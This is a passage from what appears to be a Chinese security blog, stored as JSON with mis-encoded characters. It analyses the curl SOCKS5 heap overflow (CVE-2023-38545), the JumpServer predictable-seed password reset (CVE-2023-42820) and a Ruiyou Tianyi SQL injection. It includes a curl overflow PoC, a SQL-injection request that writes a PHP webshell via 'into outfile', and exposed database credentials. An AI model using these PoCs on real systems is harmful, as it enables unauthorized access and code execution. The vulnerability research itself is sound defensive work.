è¯·æ±‚ä½“ä¸­ï¼Œè€ŒsocksreqæŒ‡å‘çš„å†…å­˜ç”±Curl_preconnectåˆ†é…\nCURLcode Curl_preconnect(struct Curl_easy *data) { if(!data-\u0026gt;state.buffer) { data-\u0026gt;state.buffer = malloc(data-\u0026gt;set.buffer_size + 1); if(!data-\u0026gt;state.buffer) return CURLE_OUT_OF_MEMORY; } return CURLE_OK; } åœ¨æˆ‘çš„ç¯å¢ƒä¸­å¯ä»¥çœ‹åˆ°æœ€ç»ˆçš„å†…å­˜å¤§å°ä¸º0x8ce+1\ngefâ¤ p data.set.buffer_size $12 = 0x8ce gefâ¤ æ‰€ä»¥å¦‚æœæ„é€ å¤§äºè¿™ä¸ªå¤§å°çš„hostnameï¼Œåœ¨memcpyæ—¶å°±å¯ä»¥è§¦å‘å †æº¢å‡ºã€‚\nPoC\ncurl --location --limit-rate 2254B --socks5-hostname 192.168.32.1:10808 $(python3 -c \u0026#34;print(\u0026#39;A\u0026#39;*10000,end=\u0026#39;\u0026#39;)\u0026#34;) å°ç»“ åœ¨ä¿®å¤ä»£ç ä¸­ï¼Œå¦‚æœhostnameè¶…è¿‡255åˆ™ä¼šç›´æ¥è¿”å›é”™è¯¯ï¼Œè€Œä¸å†è®¿é—®åé¢çš„çŠ¶æ€æœºï¼Œç›´æ¥é˜»æ–­äº†è°ƒç”¨é“¾ã€‚è™½ç„¶urlçš„hostnameæ²¡æœ‰é•¿åº¦è§„å®šï¼Œå¯ä»¥è¶…è¿‡1024ï¼Œä½†ç”±äºDNSè§£ææœ€å¤§åªæ”¯æŒ255å­—èŠ‚çš„åŸŸåï¼Œæ‰€ä»¥åœ¨æ­£å¸¸è¯·æ±‚ä¸­ä¸åº”è¯¥å‡ºç°åŸŸåå¤§äº255çš„æƒ…å†µï¼Œä»è¿™ä¸ªè§’åº¦çœ‹æ­¤æ¬¡ä¿®å¤æ–¹å¼ä¹Ÿå¾ˆåˆç†ã€‚\nä»åˆ©ç”¨è§’åº¦çœ‹è¿™ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…éœ€è¦å¯ä»¥æ§åˆ¶curlæˆ–libcurlä½¿ç”¨çš„socks5ä»£ç†ï¼Œè¿˜éœ€è¦æ§åˆ¶ä¼ é€’ç»™curlå’Œlibcurlçš„urlï¼Œè€Œåæ‰èƒ½è§¦å‘æ¼æ´ï¼Œè¡¨é¢çœ‹æ”»å‡»è€…å¯ä»¥æ§åˆ¶æº¢å‡ºçš„èŒƒå›´å’Œå†…å®¹ï¼Œå¾ˆå¯èƒ½é€šè¿‡å †æº¢å‡ºé€ æˆä»£ç æ‰§è¡Œã€‚ä½†curlä¼šé€šè¿‡url parserå»éªŒè¯urlæœ‰æ•ˆæ€§ï¼Œå¦‚æœurlæ— æ•ˆåˆ™ä¼šäº§ç”Ÿé”™è¯¯ï¼Œå› æ­¤åªå½“urlåˆæ³•æ—¶æ‰ä¼šè§¦å‘æ¼æ´ï¼Œä¹Ÿå°±æ˜¯æ”»å‡»è€…æ„é€ çš„urlåªèƒ½æ˜¯ASCIIå­—ç¬¦çš„å­é›†ï¼Œç»¼åˆä¸Šé¢çš„æ¡ä»¶ï¼Œè¿™ä¸ªæ¼æ´åˆ©ç”¨éš¾åº¦æå¤§ï¼Œé€ æˆä»£ç æ‰§è¡Œçš„å‡ ç‡å¾ˆå°ã€‚\nè€ƒè™‘åˆ°å¤§éƒ¨åˆ†è½¯ä»¶å³ä½¿èƒ½æ§åˆ¶urlï¼Œä½†ä¹Ÿä¸èƒ½æ§åˆ¶è®©libcurlä½¿ç”¨socks5ä»£ç†ï¼Œæ‰€ä»¥å¯ä»¥æ‹©æœŸä¿®å¤è¿™ä¸ªæ¼æ´ã€‚\né¢˜å¤–è¯ è¿™ä¸ªæ¼æ´è¿˜è®©curlçš„ä½œè€…éš¾è¿‡äº†ä¸€ä¸‹ï¼šIt burns in my soul. ä½œè€…è¯´ï¼Œå¦‚æœä½¿ç”¨å†…å­˜å®‰å…¨çš„è¯­è¨€é‡å†™curlçš„è¯ï¼Œé‚£è¿™äº›æ¼æ´å°±ä¸ä¼šå­˜åœ¨ï¼Œå½“ç„¶åœ¨å¯é¢„è§çš„æœªæ¥curlè¿˜æ˜¯ä¼šç”¨cå¼€å‘ï¼Œä½†ç›®å‰å¯è¡Œçš„åŠæ³•æ˜¯é€æ¸ä½¿ç”¨å†…å­˜å®‰å…¨çš„ä¾èµ–é¡¹æ›¿ä»£ã€‚\nå‚è€ƒé“¾æ¥\nhttps://curl.se/docs/CVE-2023-38545.html\nhttps://daniel.haxx.se/blog/2023/10/11/how-i-made-a-heap-overflow-in-curl/\nhttps://hackerone.com/reports/2187833\nhttps://datatracker.ietf.org/doc/html/rfc1928\nCreated at 2023-10-11T20:40:32+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/","title":"CVE-2023-42820 Jumpserver ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ jumpserverä¸­ç¬¬ä¸‰æ–¹åº“å‘ç”¨æˆ·å…¬å¼€äº†éšæœºåº“æ‰€ç”¨çš„seedï¼Œå¹¶ä¸”æ²¡æœ‰é™åˆ¶é‡ç½®å¯†ç æ¥å£çš„æ¬¡æ•°ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è·å–åˆ°éšæœºåº“çš„éšæœºç§å­å¹¶å°è¯•é¢„æµ‹é‡ç½®å¯†ç çš„éªŒè¯ç ï¼Œè¿›è€Œé‡ç½®ä»»æ„ç”¨æˆ·å¯†ç ã€‚ åˆ©ç”¨è¯¥æ¼æ´éœ€è¦å·²çŸ¥ç”¨æˆ·åå’Œå¯¹åº”çš„é‚®ç®±ã€‚\næŒ‡çº¹ hunter\nweb.title=\u0026#34;jumpserver\u0026#34; å½±å“ç‰ˆæœ¬ CVE-2023-42820 v2.24 - v3.6.4 ç¯å¢ƒæ­å»º å‚è€ƒ\rhttps://github.com/jumpserver/Dockerfileï¼Œå°†ç‰ˆæœ¬æ”¹ä¸º3.6.4ï¼Œä½¿ç”¨dockerå¯åŠ¨å³å¯ã€‚\næŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• è¡¥ä¸åˆ†æ æ¼æ´åœ¨commit 0eba6d2175ab752399c5aee2dbaaf311bf0a398dä¿®å¤ï¼ŒæŸ¥çœ‹è¡¥ä¸ï¼Œå¯çŸ¥åœ¨apps/common/utils/random.py#random_stringå¤„å¢åŠ äº† random.seed()è°ƒç”¨ï¼ŒåŒæ—¶å¯¹ apps/users/models/user.py#generate_reset_tokenç”Ÿæˆtokenæ”¹ä¸ºå¢åŠ äº† random.seedè°ƒç”¨çš„random_stringå‡½æ•° åˆ°è¿™é‡Œåªèƒ½éšçº¦çŒœåˆ°æ˜¯ä¸€ä¸ªå¯†ç å­¦æœ‰å…³çš„æ¼æ´ï¼Œåº”è¯¥å¯ä»¥é€šè¿‡çˆ†ç ´åˆ©ç”¨ã€‚\næŠ€æœ¯åˆ†æ åœ¨å‰ä¸¤å¤©æœ‰å¸ˆå‚…å†™å‡ºäº†åˆ†æï¼Œæ‰æç„¶å¤§æ‚Ÿã€‚\næ ¹æ®\rjumpserveræœ€æ–°re-authå¤ç°ï¼ˆä¼ªéšæœºç»å…¸æ¡ˆä¾‹ï¼‰å¯çŸ¥åœ¨æœ¬ä¾‹çš„jumpserverä¸­åœ¨å¦‚ä¸‹åœ°æ–¹ç”Ÿæˆé‡ç½®å¯†ç æ—¶çš„éªŒè¯ç ï¼Œå…¶ä¸­ä½¿ç”¨äº†æœ¬æ¬¡ä¿®å¤çš„å‡½æ•° random_stringç”Ÿæˆ6ä½ï¼ŒèŒƒå›´ä¸º000000-999999çš„æ•°å­—éªŒè¯ç \nopt/jumpserver/apps/authentication/api/password.py def create(self, request, *args, **kwargs): token = request.GET.get(\u0026#39;token\u0026#39;) userinfo = cache.get(token) if not userinfo: return HttpResponseRedirect(reverse(\u0026#39;authentication:forgot-previewing\u0026#39;)) serializer = self.get_serializer(data=request.data) serializer.is_valid(raise_exception=True) username = userinfo.get(\u0026#39;username\u0026#39;) form_type = serializer.validated_data[\u0026#39;form_type\u0026#39;] code = random_string(6, lower=False, upper=False) with open(\u0026#34;/tmp/code\u0026#34;,\u0026#34;a\u0026#34;) as f: f.write(code+\u0026#34;\\n\u0026#34;) other_args = {} target = serializer.validated_data[form_type] if form_type == \u0026#39;sms\u0026#39;: query_key = \u0026#39;phone\u0026#39; target = target.lstrip(\u0026#39;+\u0026#39;) else: query_key = form_type user, err = self.is_valid_user(username=username, **{query_key: target}) if not user: return Response({\u0026#39;error\u0026#39;: err}, status=400) subject = \u0026#39;%s: %s\u0026#39; % (get_login_title(), _(\u0026#39;Forgot password\u0026#39;)) context = { \u0026#39;user\u0026#39;: user, \u0026#39;title\u0026#39;: subject, \u0026#39;code\u0026#39;: code, } message = render_to_string(\u0026#39;authentication/_msg_reset_password_code.html\u0026#39;, context) other_args[\u0026#39;subject\u0026#39;], other_args[\u0026#39;message\u0026#39;] = subject, message SendAndVerifyCodeUtil(target, code, backend=form_type, **other_args).gen_and_send_async() return Response({\u0026#39;data\u0026#39;: \u0026#39;ok\u0026#39;}, status=200) åœ¨å¤§å­¦å­¦ä¹ cè¯­è¨€çš„randå‡½æ•°æ—¶ï¼Œå¦‚æœä¸å¯¹å…¶æ˜¾å¼ä½¿ç”¨srandå‡½æ•°æ’­ç§çš„è¯ï¼Œåˆ™æ¯æ¬¡è¿è¡Œç¨‹åºéšæœºå‡ºæ¥çš„ç»“æœæ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºrandä½¿ç”¨çš„ç§å­åœ¨è®¡ç®—æœºå¯åŠ¨æ—¶å°±ä¸ä¼šå†å˜åŒ–äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨srandå‡½æ•°äº§ç”Ÿç§å­å¹¶è¿›è¡Œæ’­ç§ï¼Œæ¥ä½¿å¾—randå‡½æ•°çš„ç»“æœä¸ä¸€æ ·ã€‚ å®é™…ä¸Šè®¡ç®—æœºä¸­çš„éšæœºæ•°ä¸æ˜¯çœŸæ­£çš„éšæœºæ•°ï¼Œè€Œæ˜¯ä¼ªéšæœºæ•°ï¼Œè®¡ç®—æœºæ ¹æ®ä¼ å…¥çš„ç§å­ç»è¿‡æŸäº›è¿ç®—å¾—å‡ºç»“æœã€‚ å¯¹äºä¸€ä¸ªè¿›ç¨‹ï¼Œéšæœºçš„ç§å­ç¡®å®šåˆ™éšæœºæ•°ä¹Ÿç¡®å®šã€‚ è¿™ä¸ªè§„å¾‹åœ¨pythonä¸­ä¹Ÿä¸€æ ·ï¼Œå¯¹äºåŒæ ·çš„seedåŠåŒæ ·çš„éšæœºæ¬¡æ•°ï¼Œä¸€å®šä¼šç”ŸæˆåŒæ ·çš„æ•°å­—ã€‚\nPython 3.11.4 (tags/v3.11.4:d2340ef, Jun 7 2023, 05:45:37) [MSC v.1934 64 bit (AMD64)] on win32 Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import random \u0026gt;\u0026gt;\u0026gt; random.seed(1010) \u0026gt;\u0026gt;\u0026gt; random.random() 0.6710054770408643 âœ chestnut python3 Python 3.11.4 (main, Jun 7 2023, 10:13:09) [GCC 12.2.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import random \u0026gt;\u0026gt;\u0026gt; random.seed(1010) \u0026gt;\u0026gt;\u0026gt; random.random() 0.6710054770408643 \u0026gt;\u0026gt;\u0026gt; è™½ç„¶æˆ‘ä»¬ç°åœ¨çŸ¥é“äº†è¿™ä¸ªæ¼æ´åº”è¯¥æºäºä¼ªéšæœºæ•°ï¼Œä½†æˆ‘ä»¬å¦‚æœæ²¡åŠæ³•è·å–åˆ°éšæœºæ—¶æ‰€è®¾ç½®çš„ç§å­ï¼Œä¹Ÿæ²¡åŠæ³•é¢„æµ‹éšå³ç»“æœã€‚\nä¸‹é¢å°±æ˜¯è¿™ä¸ªæ¼æ´çš„ç²¾åæ‰€åœ¨ï¼Œæ ¹æ®æ–‡ç« æ‰€è¿°ã€‚ djangoä½¿ç”¨äº†ç¬¬ä¸‰æ–¹åº“djiango-simple-captchaåº“æ¥ç”ŸæˆéªŒè¯ç ï¼Œåœ¨è¿™ä¸ªåº“ç”Ÿæˆçš„æ—¶å€™ä¼šæœ‰å¦‚ä¸‹é€»è¾‘ï¼š åœ¨usr/local/lib/python3.11/site-packages/captcha/views.py$captcha_imageä¸­ï¼Œé€šè¿‡ä¼ å…¥çš„keyè®¾ç½®random.seed()ï¼Œè€Œä¼ å…¥çš„keyåˆ™æ˜¯æµè§ˆå™¨å‘åç«¯è¯·æ±‚å›¾ç‰‡çš„è·¯å¾„ï¼Œä¸‹å›¾çš„keyä¸º c83d66ac7dca7e2189ad17a9a3e532f2e87d5c07\ndef captcha_image(request, key, scale=1): if scale == 2 and not settings.CAPTCHA_2X_IMAGE: raise Http404 try: store = CaptchaStore.objects.get(hashkey=key) except CaptchaStore.DoesNotExist: # HTTP 410 Gone status so that crawlers don\u0026#39;t index these expired urls. return HttpResponse(status=410) random.seed(key) # Do not generate different images for the same key text = store.challenge ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å›¾ç‰‡çš„urlé—´æ¥çŸ¥é“jumpserveréšæœºæ—¶æ‰€ä½¿ç”¨çš„ç§å­ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡å›¾ç‰‡åœ°å€æˆ‘ä»¬å¯ä»¥è·å–åˆ°ç§å­ï¼Œå¦‚æœç”ŸæˆéªŒè¯ç æ—¶æ‰€åœ¨çš„è¿›ç¨‹å’Œè¿™ä¸ªç”Ÿæˆå›¾ç‰‡éªŒè¯ç çš„è¿›ç¨‹åœ¨åŒä¸€ä¸ªè¿›ç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è·å–åˆ°çš„ç§å­å’Œä½¿ç”¨jumpserverç”ŸæˆéªŒè¯ç çš„ç®—æ³•æ¥é¢„æµ‹jumpserverç”Ÿæˆé‡ç½®å¯†ç çš„éªŒè¯ç ã€‚ è¿™æ ·æˆ‘ä»¬å¯ä»¥åœ¨å¾ˆå°‘çš„æ—¶é—´ï¼ˆæ¬¡æ•°ï¼‰å†…é¢„æµ‹åˆ°é‡ç½®å¯†ç çš„éªŒè¯ç ï¼Œè¿›è€Œé‡ç½®å¯†ç ã€‚ ä½†ä»…ä»…è¿™ä¹ˆç®€å•å—ï¼Ÿåœ¨jumpserverä¸­ä½¿ç”¨äº† gunicornï¼Œå®ƒä¼šä½¿ç”¨masterè¿›ç¨‹fork workerè¿›ç¨‹ï¼Œå¤„ç†ç”¨æˆ·è¯·æ±‚ï¼Œæ‰€ä»¥å³ä½¿æˆ‘ä»¬é€šè¿‡å•æ¬¡çš„å›¾ç‰‡è¯·æ±‚è·å–åˆ°äº†randomçš„ç§å­ï¼Œå¤„ç†é‡ç½®å¯†ç è¯·æ±‚çš„è¿›ç¨‹å¯èƒ½ä¸æ˜¯è¢«è·å–åˆ°ç§å­çš„è¿›ç¨‹ï¼Œè¿™æ ·é¢„æµ‹å‡ºæ¥çš„éªŒè¯ç å’Œé‡ç½®å¯†ç æ—¶ç”Ÿæˆçš„ä¸ä¼šä¸€æ ·ã€‚\nâœ chestnut docker top 808b | grep python root 5704 5674 0 11:08 ? 00:00:02 python jms start web root 5864 5704 0 11:08 ? 00:00:01 /usr/local/bin/python /usr/local/bin/celery -A ops flower -logging=info --url_prefix=/core/flower --auto_refresh=False --max_tasks=1000 --state_save_interval=600000 root 5865 5704 0 11:08 ? 00:00:00 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - root 5867 5865 0 11:08 ? 00:00:01 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - root 5868 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - root 5873 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - root 5874 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - åœ¨æ–‡ç« ä¸­æåˆ°å¯ä»¥æœ‰ä¸¤ç§åŠæ³•ï¼š\nå¹¶å‘åŒæ—¶å‘é€å¤šä¸ªè¯·æ±‚ï¼Œé€šè¿‡å¤§é‡è¯·æ±‚ä½¿å¾—æ¯ä¸ªgunicornè¿›ç¨‹éƒ½ä¼šæ¥æ”¶åˆ°å›¾ç‰‡éªŒè¯ç çš„è¯·æ±‚ï¼Œä»è€Œå°†æ‰€æœ‰è¿›ç¨‹çš„seedè®¾ç½®ä¸ºåŒä¸€ä¸ªç§å­ï¼Œè¿™æ ·åç»­é‡ç½®å¯†ç æ—¶æ— è®ºå“ªä¸ªè¿›ç¨‹æ¥æ”¶åˆ°çš„è¯·æ±‚ï¼Œè¯¥è¿›ç¨‹çš„seedéƒ½æ˜¯å·²çŸ¥çš„ã€‚ é€šè¿‡æŸç§åŠæ³•å°†gunicornæ‰“æŒ‚ï¼Œå¹¶ç›‘æµ‹æœåŠ¡çŠ¶æ€ï¼Œå½“æœåŠ¡å“åº”ç ä»502å˜ä¸º200æ—¶ï¼Œè¯´æ˜è¿›ç¨‹æ¢å¤æ­£å¸¸ï¼Œè¿™æ—¶é€šè¿‡å°‘é‡è¯·æ±‚å³å¯å°†æ‰€æœ‰ç›®æ ‡è¿›ç¨‹çš„seedè®¾ç½®ä¸ºæˆ‘ä»¬å·²çŸ¥çš„å€¼ã€‚ å¹¶å‘å‘é€å¤§é‡è¯·æ±‚è®©æˆ‘æƒ³èµ·äº†k8sç¯å¢ƒä¸­ï¼Œpodåˆ‡æ¢IPçš„åœºæ™¯ï¼Œ æ—¶é—´æ¯”è¾ƒç´§ï¼ˆå¤ªç¬¨äº†ï¼‰ï¼Œæ²¡çœ‹å‡ºæ¥å“ªé‡Œå¯ä»¥é€ æˆcrashï¼Œåœ¨ä½¿ç”¨ç¬¬ä¸€ç§åŠæ³•çš„æ—¶å€™ï¼Œå‘ç°ä¼šæœ‰äº›è®¸é—®é¢˜\nåœ¨å‘é€å‡ åƒä¸ªè¯·æ±‚ä¹‹åï¼Œé€šè¿‡å›¾ç‰‡éªŒè¯ç è¯·æ±‚è§¦å‘é‡ç½®å¯†ç æ—¶ï¼Œåç«¯ä¼šè¿”å›è¿™ä¸ªéªŒè¯ç ä¸æ­£ç¡® åœ¨å‘é€è¯·æ±‚ä¹‹åï¼Œç»è¿‡æµ‹è¯•ä½¿ç”¨seedç”Ÿæˆå’Œjumpserverç›¸åŒçš„codeéœ€è¦ç»è¿‡å‡ ä¸‡æ¬¡ æ‰€ä»¥åœ¨è¿™é‡Œè®¨å·§ï¼Œæ‰‹åŠ¨é‡å¯core containerï¼ˆæ¨¡æ‹Ÿcrashäº†gunicornçš„åœºæ™¯ï¼‰ï¼Œè€Œåé€šè¿‡è¯·æ±‚éªŒè¯ç å›¾ç‰‡è®¾ç½®seedï¼Œç»è¿‡æµ‹è¯•æˆåŠŸçš„æ¬¡æ•°èŒƒå›´ä¸º200+ï¼Œå³æˆåŠŸç”Ÿæˆå’Œjumpserverä¸€æ ·çš„é‡ç½®å¯†ç éªŒè¯ç éœ€è¦randomä¸¤ç™¾å¤šæ¬¡ã€‚\nå°ç»“ å›è¿‡å¤´çœ‹æ–‡ç« æ‰€è¯´çš„ éšæœºæ·±åº¦ï¼ŒæŒ‰ç…§æˆ‘çš„ç†è§£å°±æ˜¯åœ¨ç”Ÿæˆcodeæ—¶ï¼Œæ‰€åœ¨è¿›ç¨‹å·²ç»randomäº†å‡ æ¬¡ï¼Œéšæœºæ¬¡æ•°è¶Šå¤šï¼Œé¢„æµ‹æ—¶æ‰€è¦çš„æ¬¡æ•°ä¹Ÿå°±è¶Šå¤šï¼Œå› ä¸ºç›¸åŒçš„seedç»è¿‡ç›¸åŒçš„æ¬¡æ•°ç”Ÿæˆçš„éšæœºæ•°æ˜¯ä¸€æ ·çš„ï¼Œåœ¨ç”ŸæˆéªŒè¯ç å’Œrandom_stringå‡½æ•°ä¸­å‡æœ‰å¤šæ¬¡ä½¿ç”¨randomç±»å‡½æ•°ç”Ÿæˆéšæœºæ•°ï¼Œæ‰€ä»¥æ‰éœ€è¦å¾ªç¯è®¡ç®—è¿›è¡Œç¢°æ’ã€‚ åœ¨æ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œé™¤äº†å‰é¢è¯´çš„è¦†ç›–seedçš„é—®é¢˜ï¼Œjumpserverè¿˜ä¼šéªŒè¯è¯·æ±‚urlé‡Œé¢çš„tokenä»¥åŠPOSTçš„bodyé‡Œé¢éœ€è¦æºå¸¦csrf tokenï¼Œè¿™äº›éƒ½å¯ä»¥é€šè¿‡urlè§£æä»¥åŠxpathä»è¯·æ±‚å“åº”ä¸­è·å–åˆ°ã€‚åœ¨ä¸€ä¸ªå°±æ˜¯ç”Ÿæˆé‡ç½®å¯†ç éªŒè¯ç åï¼Œè¿™ä¸ªéªŒè¯ç æœ‰60ç§’æœ‰æ•ˆæœŸï¼Œè¿‡äº†60ç§’ä¹‹åå†å»ç¢°æ’åç«¯ä¼šè¿”å›éªŒè¯ç å·²è¿‡æœŸï¼Œéœ€è¦é‡æ–°ç”Ÿæˆã€‚ åœ¨æœ‰ä¸ªé—®é¢˜å°±æ˜¯å›¾ç‰‡éªŒè¯ç æ¶‰åŠåˆ°æ•°å­¦è¿ç®—ï¼Œç²—ç•¥çœ‹æ¥éªŒè¯ç åº”è¯¥å¯ä»¥é€šè¿‡ocråº“è¿›è¡Œè¯†åˆ«å¹¶è®¡ç®—ï¼Œå®ç°è‡ªåŠ¨åŒ–è·å–å›¾ç‰‡åœ°å€ã€è®¾ç½®seedã€è®¡ç®—éªŒè¯ç ç­‰ï¼Œè¿™ä¸ªåªèƒ½ç­‰èŠ‚åä»”ç»†ç ”ç©¶äº†ã€‚\nå‚è€ƒé“¾æ¥\nhttps://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp\nhttps://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw\nåˆ›å»ºäº2023-09-28\nCreated at 2023-09-29T20:32:52+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/","title":"ç‘å‹å¤©ç¿¼ Rceåˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ ç¯å¢ƒæ­å»º ç•¥\nå½±å“ç‰ˆæœ¬ ç•¥\næŠ€æœ¯åˆ†æ æ•°æ®åº“åŸºæœ¬ä¿¡æ¯\n127.0.0.1:5873 db: CASSystemDS pwd: F1B5214C user: admin åœ¨ConsoleExternalApi.XGIä¸­æ ¹æ®ä»£ç é€»è¾‘å¯å¾—ï¼Œè¯·æ±‚ä¸­éœ€æºå¸¦initparamsã€keyã€signç­‰å‚æ•°\n$initparams = $_REQUEST[\u0026#39;initParams\u0026#39;]; $key = $_REQUEST[\u0026#39;key\u0026#39;]; $sign = $_REQUEST[\u0026#39;sign\u0026#39;]; å‚æ•°æ ¡éªŒé€»è¾‘å¦‚ä¸‹ï¼Œæ­¤æ—¶ç›´æ¥ä½¿ç”¨key=innerç»•è¿‡åˆ¤æ–­ï¼Œåˆ™$keyValå€¼ä¸ºRealorï¼Œä¸‹é¢æ‹¼æ¥äº†$initparamså’Œ$keyValå¹¶è®¡ç®—å…¶md5å€¼æ˜¯å¦å’Œsignå˜é‡ç›¸åŒã€‚\nif ($key == \u0026#34;wusuokey\u0026#34;) { $keyVal = $COMCASWEB-\u0026gt;getfarminfo($key); } else if ($key == \u0026#34;inner\u0026#34;) { $keyVal = \u0026#34;Realor\u0026#34;; } if (!isset($keyVal) || empty($keyVal)) { write_log(\u0026#34;{\u0026#39;å‚æ•°éæ³•\u0026#39;:\u0026#39;keyå€¼ä¸ºç©º\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;å‚æ•°éæ³•\u0026#39;); } $signCalculate = md5($initparams . $keyVal); //testLog(\u0026#34;signCalculate=\u0026#34; . $signCalculate); if ($signCalculate != $sign) { write_log(\u0026#34;{\u0026#39;å‚æ•°éæ³•\u0026#39;:\u0026#39;å‚æ•°åŠ å¯†æ–¹æ³•é”™è¯¯\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;å‚æ•°éæ³•\u0026#39;); } ä¹‹åä½¿ç”¨ä¸¤ä¸ªä¸‹åˆ’çº¿åˆ†å‰²$initparamså˜é‡ï¼Œå­˜å…¥æ•°ç»„å¹¶éå†æ•°ç»„\n// ä¸¤ä¸ªä¸‹åˆ’çº¿åˆ†å‰²ï¼Œå˜æˆä¸€ä¸ªæ•°ç»„ï¼Œä¹‹åéå†æ•°ç»„ï¼Œç”¨ä¸€ä¸ªä¸‹åˆ’çº¿åˆ†å‰²å¹¶å˜æˆé”®å€¼å¯¹å­˜å…¥$requestObjå˜é‡ä¸­ã€‚ $paramArr = explode(\u0026#34;__\u0026#34;, $initparams); if (count($paramArr) == 0) { write_log(\u0026#34;{\u0026#39;å‚æ•°éæ³•\u0026#39;:\u0026#39;å‚æ•°ä¸­æœªåŒ…å«__\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;å‚æ•°éæ³•11\u0026#39;); } $requestObj = null; //testLog($paramArr); foreach ($paramArr as $key =\u0026gt; $value) { $keyValue = explode(\u0026#34;_\u0026#34;, $value); $requestObj[$keyValue[0]] = $keyValue[1]; } ä¹‹åä»é”®å€¼å¯¹æ•°ç»„ä¸­å–å‡ºé”®ä¸ºcommandçš„å€¼ï¼Œè¿›è¡Œåˆ¤æ–­ $cmd = $requestObj['command']; å½“$cmdä¸ºcreateUseræ—¶ï¼Œä»è¯·æ±‚ä¸­å–å‡ºPOST bodyå¹¶å°è¯•è¿›è¡Œjson decodeï¼Œä»ä¸­å–å‡ºé”®ä¸ºaccountçš„å€¼æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨å•å¼•å·è¿›è¡Œsqlæ³¨å…¥ï¼Œå€ŸåŠ©union select into outfileè¯­å¥å†™å…¥webshellï¼Œè¾¾æˆä»£ç æ‰§è¡Œã€‚\nif ($cmd == \u0026#34;createUser\u0026#34;) { $POST_JSON = json_decode($HTTP_RAW_POST_DATA, true); $fId = getDefaultVal($POST_JSON[\u0026#39;userGroupId\u0026#39;], getAdminGroupId()); $account = $POST_JSON[\u0026#39;account\u0026#39;]; if (!isset($account) || empty($account)) { write_log(\u0026#34;{\u0026#39;createUser\u0026#39;:\u0026#39;ç”¨æˆ·è´¦æˆ·ä¸å¯ä¸ºç©º\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;ç”¨æˆ·è´¦å·ä¸å¯ä¸ºç©º\u0026#39;); } $account = utf8ToGbk($account); $userPwd = $POST_JSON[\u0026#39;userPwd\u0026#39;]; if (!isset($userPwd) || empty($userPwd)) { write_log(\u0026#34;{\u0026#39;createUser\u0026#39;:\u0026#39;ç”¨æˆ·å¯†ç ä¸å¯ä¸ºç©º\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;ç”¨æˆ·å¯†ç ä¸å¯ä¸ºç©º\u0026#39;); } //è´¦å·æ˜¯å¦å·²å­˜åœ¨ $result = mysql_query(\u0026#34;select * from cuser where name=\u0026#39;\u0026#34; . $account . \u0026#34;\u0026#39;\u0026#34;, $DSCon); PoC\nGET /index.php/Index/dologin?name=aa\u0026#39;);SELECT%20%22%3C?php%20phpinfo();?%3E%22%20into%20outfile%20%22../../WebRoot/1.php%22;\u0026#39; HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close 